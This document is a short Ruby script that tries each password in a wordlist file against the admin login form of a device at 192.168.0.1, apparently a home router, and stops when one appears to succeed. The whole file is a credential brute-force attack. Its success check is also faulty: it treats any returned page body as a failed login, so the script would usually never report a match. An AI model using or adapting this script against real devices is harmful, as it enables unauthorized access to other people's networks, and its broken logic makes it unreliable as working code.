require 'net/http'
require 'uri'

def is_wrong_password password
	uri = URI.parse 'http://192.168.0.1/'
	responce = Net::HTTP.post_form(uri, :Username => "admin", :password => password).body
	return responce
end

input = File.open "parols.txt", "r"

while (line = input.gets)
	line.strip!
	print "Trying password #{line}..."

	if is_wrong_password line
		puts "Error"
	else
		puts "Found!"
		input.close
		exit
	end
end